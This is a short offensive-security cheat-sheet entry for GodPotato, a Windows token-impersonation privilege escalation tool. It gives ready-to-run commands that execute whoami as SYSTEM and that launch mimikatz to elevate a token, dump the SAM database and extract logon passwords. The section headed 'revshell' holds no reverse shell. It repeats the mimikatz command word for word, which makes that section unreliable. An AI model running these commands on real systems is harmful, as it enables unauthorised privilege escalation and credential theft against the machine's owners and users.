# GodPotato

% SeAssignPrimaryToken, SeImpersonate, token
#plateform/windows #target/local #cat/PRIVESC/TOKEN


## test 
https://github.com/BeichenDream/GodPotato
```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
```


## mimikatz 
https://github.com/BeichenDream/GodPotato
```cmd
.\GodPotato.exe -cmd  'cmd /c c:\temp\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords /all" "exit"'
```


## revshell 
https://github.com/BeichenDream/GodPotato
```cmd
.\GodPotato.exe -cmd  'cmd /c c:\temp\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords /all" "exit"'
```